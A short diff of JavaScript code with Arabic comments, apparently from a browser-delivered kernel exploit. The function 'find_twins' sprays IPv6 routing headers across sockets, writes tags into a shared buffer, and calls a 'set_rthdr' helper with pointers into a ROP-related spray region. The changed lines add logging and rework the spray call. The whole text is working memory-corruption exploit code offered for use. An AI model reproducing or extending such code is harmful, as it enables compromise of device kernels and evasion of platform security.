@@ -899,14 +899,24 @@ function find_twins() {
 
       var tag = RTHDR_TAG | i;
 
+      // لوج قديم لو حابب تسيبه أو تقلله
+      log("[WRITE] sock=" + i +
+          " tag=" + hex(tag));
+
+      // كتابة التاج في البافر المشترك
       write32(spray_add, tag);
       read32(spray_add);
 
-      setsockopt(
+      // 🔥 اللوج الجديد + استدعاء set_rthdr الحقيقي
+      var spray_ptr = spray_rthdr_rop.add(i * UCRED_SIZE);
+
+      log("[WRITE] sock=" + i +
+          " spray_ptr=" + hex(spray_ptr) +
+          " len=" + spray_rthdr_len);
+
+      set_rthdr(
         ipv6_socks[i],
-        IPPROTO_IPV6,
-        IPV6_RTHDR,
-        spray_rthdr,
+        spray_ptr,
         spray_rthdr_len
       );
     }
